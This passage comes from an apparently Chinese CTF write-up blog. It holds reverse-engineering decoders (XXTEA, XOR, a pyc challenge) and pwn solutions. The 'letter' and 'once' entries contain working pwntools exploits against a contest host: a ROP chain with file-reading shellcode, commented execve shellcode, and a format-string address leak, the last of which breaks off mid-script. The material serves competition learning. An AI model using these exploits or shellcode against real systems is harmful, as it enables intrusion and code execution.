        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>  
  
  
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>  
    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xE74EB323</span><span class="token punctuation">,</span><span class="token number">0xB7A72836</span><span class="token punctuation">,</span><span class="token number">0x59CA6FE2</span><span class="token punctuation">,</span><span class="token number">0x967CC5C1</span><span class="token punctuation">,</span>
                <span class="token number">0xE7802674</span><span class="token punctuation">,</span><span class="token number">0x3D2D54E6</span><span class="token punctuation">,</span><span class="token number">0x8A9D0356</span><span class="token punctuation">,</span><span class="token number">0x99DCC39C</span><span class="token punctuation">,</span>
                <span class="token number">0x7026D8ED</span><span class="token punctuation">,</span><span class="token number">0x6A33FDAD</span><span class="token punctuation">,</span><span class="token number">0xF496550A</span><span class="token punctuation">,</span><span class="token number">0x5C9C6F9E</span><span class="token punctuation">,</span>
                <span class="token number">0x1BE5D04C</span><span class="token punctuation">,</span><span class="token number">0x6723AE17</span><span class="token punctuation">,</span><span class="token number">0x5270A5C2</span><span class="token punctuation">,</span><span class="token number">0xAC42130A</span><span class="token punctuation">,</span>
                <span class="token number">0x84BE67B2</span><span class="token punctuation">,</span><span class="token number">0x705CC779</span><span class="token punctuation">,</span><span class="token number">0x5C513D98</span><span class="token punctuation">,</span><span class="token number">0xFB36DA2D</span><span class="token punctuation">,</span>
                <span class="token number">0x22179645</span><span class="token punctuation">,</span><span class="token number">0x5CE3529D</span><span class="token punctuation">,</span><span class="token number">0xD189E1FB</span><span class="token punctuation">,</span><span class="token number">0xE85BD489</span><span class="token punctuation">,</span>
                <span class="token number">0x73C8D11F</span><span class="token punctuation">,</span><span class="token number">0x54B5C196</span><span class="token punctuation">,</span><span class="token number">0xB67CB490</span><span class="token punctuation">,</span><span class="token number">0x2117E4CA</span><span class="token punctuation">,</span>
                <span class="token number">0x9DE3F994</span><span class="token punctuation">,</span><span class="token number">0x2F5AA1AA</span><span class="token punctuation">,</span><span class="token number">0xA7E801FD</span><span class="token punctuation">,</span><span class="token number">0xC30D6EAB</span><span class="token punctuation">,</span>
                <span class="token number">0x1BADDC9C</span><span class="token punctuation">,</span><span class="token number">0x3453B04A</span><span class="token punctuation">,</span><span class="token number">0x92A406F9</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  
    <span class="token keyword">int</span> n<span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密  </span>
            <span class="token comment">// v为要加密的数据是两个32位无符号整数  </span>
            <span class="token comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位    </span>

    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token operator">-</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">35</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>  

<span class="token comment">// 23 B3 4E E7 36 28 A7 B7  E2 6F CA 59 C1 C5 7C 96</span>
<span class="token number">0xE7</span> <span class="token number">4</span>E B3 <span class="token number">23</span><span class="token punctuation">,</span><span class="token number">0xB7</span> A7 <span class="token number">28</span> <span class="token number">36</span><span class="token punctuation">,</span><span class="token number">0x59</span> CA <span class="token number">6F</span> E2<span class="token punctuation">,</span><span class="token number">0x96</span> <span class="token number">7</span>C C5 C1
<span class="token comment">// 74 26 80 E7 E6 54 2D 3D  56 03 9D 8A 9C C3 DC 99</span>
<span class="token number">0xE7</span> <span class="token number">80</span> <span class="token number">26</span> <span class="token number">74</span><span class="token punctuation">,</span><span class="token number">0x3D</span> <span class="token number">2</span>D <span class="token number">54</span> E6<span class="token punctuation">,</span><span class="token number">0x8A9D0356</span><span class="token punctuation">,</span><span class="token number">0x99</span> DC C3 <span class="token number">9</span>C<span class="token punctuation">,</span>
<span class="token comment">// ED D8 26 70 AD FD 33 6A  0A 55 96 F4 9E 6F 9C 5C</span>
<span class="token number">0x70</span> <span class="token number">25</span> D8 ED<span class="token punctuation">,</span><span class="token number">0x6A</span> <span class="token number">33</span> FD AD<span class="token punctuation">,</span><span class="token number">0xF4</span> <span class="token number">96</span> <span class="token number">55</span> <span class="token number">0</span>A<span class="token punctuation">,</span><span class="token number">0x5C9C6F9E</span><span class="token punctuation">,</span>
<span class="token comment">// 4C D0 E5 1B 17 AE 23 67  C2 A5 70 52 0A 13 42 AC</span>
<span class="token number">0x1B</span> E5 D0 <span class="token number">4</span>C<span class="token punctuation">,</span><span class="token number">0x67</span> <span class="token number">23</span> AE <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">0x52</span> <span class="token number">70</span> A5 C2<span class="token punctuation">,</span><span class="token number">0xAC</span> <span class="token number">42</span> <span class="token number">13</span> <span class="token number">0</span>A<span class="token punctuation">,</span>
<span class="token comment">// B2 67 BE 84 79 C7 5C 70  98 3D 51 5C 2D DA 36 FB</span>
<span class="token number">0x84</span> BE <span class="token number">67</span> B2<span class="token punctuation">,</span><span class="token number">0x70</span> <span class="token number">5</span>C C7 <span class="token number">79</span><span class="token punctuation">,</span><span class="token number">0x5C</span> <span class="token number">51</span> <span class="token number">3</span>D <span class="token number">98</span><span class="token punctuation">,</span><span class="token number">0xFB36DA2D</span><span class="token punctuation">,</span>
<span class="token comment">// 45 96 17 22 9D 52 E3 5C  FB E1 89 D1 89 D4 5B E8</span>
<span class="token number">0x22</span> <span class="token number">17</span> <span class="token number">96</span> <span class="token number">45</span><span class="token punctuation">,</span><span class="token number">0x5C</span> E3 <span class="token number">52</span> <span class="token number">9</span>D<span class="token punctuation">,</span><span class="token number">0xD1</span> <span class="token number">89</span> E1 FB<span class="token punctuation">,</span><span class="token number">0xE8</span> <span class="token number">5</span>B D4 <span class="token number">89</span>
<span class="token comment">// 1F D1 C8 73 96 C1 B5 54  90 B4 7C B6 CA E4 17 21</span>
<span class="token number">0x73</span> C8 D1 <span class="token number">1F</span><span class="token punctuation">,</span><span class="token number">0x54</span> B5 C1 <span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0xB6</span> <span class="token number">7</span>C B4 <span class="token number">90</span><span class="token punctuation">,</span><span class="token number">0x21</span> <span class="token number">17</span> E4 CA<span class="token punctuation">,</span>
<span class="token comment">// 94 F9 E3 9D AA A1 5A 2F  FD 01 E8 A7 AB 6E 0D C3</span>
<span class="token number">0x9D</span> E3 F9 <span class="token number">94</span><span class="token punctuation">,</span><span class="token number">0x2F</span> <span class="token number">5</span>A A1 AA<span class="token punctuation">,</span><span class="token number">0xA7</span> E8 <span class="token number">01</span> FD<span class="token punctuation">,</span><span class="token number">0xC3</span> <span class="token number">0</span>D <span class="token number">6</span>E AB
<span class="token comment">// 9C DC AD 1B 4A B0 53 34  F9 06 A4 92</span>
 <span class="token number">0x1B</span> AD DC <span class="token number">9</span>C<span class="token punctuation">,</span><span class="token number">0x34</span> <span class="token number">53</span> B0 <span class="token number">4</span>A<span class="token punctuation">,</span><span class="token number">0x92</span> A4 <span class="token number">06</span> F9<span class="token punctuation">&#125;</span>

<span class="token comment">// uint64_t a[35] = &#123;0xE74EB323,0xB7A72836,0x59CA6FE2,0x967CC5C1,</span>
<span class="token comment">//                 0xE7802674,0x3D2D54E6,0x8A9D0356,0x99DCC39C,</span>
<span class="token comment">//                 0x7026D8ED,0x6A33FDAD,0xF496550A,0x5C9C6F9E,</span>
<span class="token comment">//                 0x1BE5D04C,0x6723AE17,0x5270A5C2,0xAC42130A,</span>
<span class="token comment">//                 0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D,</span>
<span class="token comment">//                 0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489</span>
<span class="token comment">//                 0x73C8D11F,0x54B5C196,0xB67CB490,0x2117E4CA,</span>
<span class="token comment">//                 0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB</span>
<span class="token comment">//                 0x1BADDC9C,0x3453B01B,0x92A406F9&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h4><p>这题目的干扰信息比较多，找到了一个block，我还在想是否有加密，然后它里面的写法也很神奇，从后往前看的时候我才找到关键的验证参数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/welcome.jpg" alt="img"></p>
<p>上脚本：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> temp <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> a<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>
                     <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>
                     <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span><span class="token number">0xAE</span><span class="token punctuation">,</span>
                     <span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0x8F</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span>
                     <span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x97</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^=</span>temp<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="pyc，时隔一年，这次肝了一下搞明白了"><a href="#pyc，时隔一年，这次肝了一下搞明白了" class="headerlink" title="pyc，时隔一年，这次肝了一下搞明白了"></a>pyc，时隔一年，这次肝了一下搞明白了</h3><p>直接上脚本！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dis

<span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'give me your flag:\n'</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>raw_flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>
        

    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>i<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your flag: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    res <span class="token operator">=</span> <span class="token string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span>
    res <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i  <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#dis.dis(fun)</span>

<span class="token comment"># SLICE+0()</span>
<span class="token comment"># Implements TOS = TOS[:].</span>
 
<span class="token comment"># SLICE+1()</span>
<span class="token comment"># Implements TOS = TOS1[TOS:].</span>
 
<span class="token comment"># SLICE+2()</span>
<span class="token comment"># Implements TOS = TOS1[:TOS].</span>
 
<span class="token comment"># SLICE+3()</span>
<span class="token comment"># Implements TOS = TOS2[TOS1:TOS].</span>

<span class="token comment"># Since Python 3.5 this is finally no longer awkward:</span>

<span class="token comment"># >>> b'\xde\xad\xbe\xef'.hex()</span>
<span class="token comment"># 'deadbeef'</span>
<span class="token comment"># and reverse:</span>

<span class="token comment"># >>> bytes.fromhex('deadbeef')</span>
<span class="token comment"># b'\xde\xad\xbe\xef'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h4><p>送分题我的最爱</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token string">"paSsw0rd"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Do you know strcmp?</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you are right!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sorry, you are wrong.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>找到常字符串的地址注意一下端序，输入，得到flag。</p>
<h4 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h4><p>中间试了好多shellcode，结果是放在沙箱里面的233，我当场暴毙。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#io = process("./letter")</span>
<span class="token comment">#gdb.attach(io)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'182.92.108.71'</span><span class="token punctuation">,</span><span class="token number">31305</span><span class="token punctuation">)</span>

<span class="token comment">#0x0000000000400aa1 : pop rsi ; pop r15 ; ret</span>
<span class="token comment">#0x0000000000400a9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="token comment">#0x0000000000400aa3 : pop rdi ; rttet</span>


<span class="token comment">#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>

<span class="token comment">#shellcode = "\x01\x30\x8f\xe2" + "\x13\xff\x2f\xe1" + "\x78\x46\x0e\x30" +  "\x01\x90\x49\x1a" + "\x92\x1a\x08\x27" +  "\xc2\x51\x03\x37" + "\x01\xdf\x2f\x62" +  "\x69\x6e\x2f\x2f" + "\x73\x68";</span>

<span class="token comment">#shellcode = shellcraft.amd64.linux.sh()</span>
<span class="token comment">#shellcode = "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00"</span>
<span class="token comment">#context(log_level="info", os="linux", arch="amd64")</span>
<span class="token comment">#shellcode_1 = shellcraft.open("./flag")</span>
<span class="token comment">#shellcode_2 = shellcraft.read("rax","rsp",100)</span>
<span class="token comment">#shellcode_2 += shellcraft.write(1,"rsp",100)</span>
<span class="token comment">#shellcode = asm(shellcode)</span>

shellcode_1 <span class="token operator">=</span> <span class="token string">b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8/.gm`f\x01\x01H1\x04$H\x89\xe71\xd21\xf6'</span>
shellcode_2 <span class="token operator">=</span> <span class="token string">b'j\x02X\x0f\x05H\x89\xc71\xc0jdZH\x89\xe6\x0f\x05j\x01_jdZH\x89\xe6j\x01X\x0f\x05'</span>


ch_rsi_address <span class="token operator">=</span> <span class="token number">0x400aa1</span>
ch_rdi_address <span class="token operator">=</span> <span class="token number">0x400aa3</span>
read_address   <span class="token operator">=</span> <span class="token number">0x400730</span>
get_shell_address      <span class="token operator">=</span> <span class="token number">0x601500</span>
payload_1      <span class="token operator">=</span> <span class="token string">'-1'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">14</span>
payload_2      <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ch_rsi_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>get_shell_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ch_rdi_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>read_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ch_rsi_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>get_shell_address<span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>read_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>get_shell_address<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload_3      <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>shellcode_1<span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
payload_4      <span class="token operator">=</span> shellcode_2

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'how much character do you want to send?'</span><span class="token punctuation">,</span>payload_1<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"hope the letter can be sent safely.\n"</span><span class="token punctuation">,</span>payload_3<span class="token punctuation">)</span>
<span class="token comment">#io.recv()</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_4<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="once"><a href="#once" class="headerlink" title="once"></a>once</h4><p>由于开了PIE，先泄露地址，再用one_gadget那一套，最后几分钟出来的真刺激</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#io = process("once")</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc-2.27.so"</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"182.92.108.71"</span><span class="token punctuation">,</span><span class="token number">30107</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>


payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">28</span> <span class="token operator">+</span> <span class="token string">'%p'</span> <span class="token operator">+</span> <span class="token string">'%11$p'</span> <span class="token operator">+</span> <span class="token string">'%13$p'</span> <span class="token operator">+</span> <span class="token string">'\xB5'</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
rubbish     <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
rsp_addr    <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
main_76     <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
addr_offset <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\xB5'</span><span class="token punctuation">)</span>

main_76     <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>main_76<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
rsp_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rsp_addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment">#one_gadget offset</span>
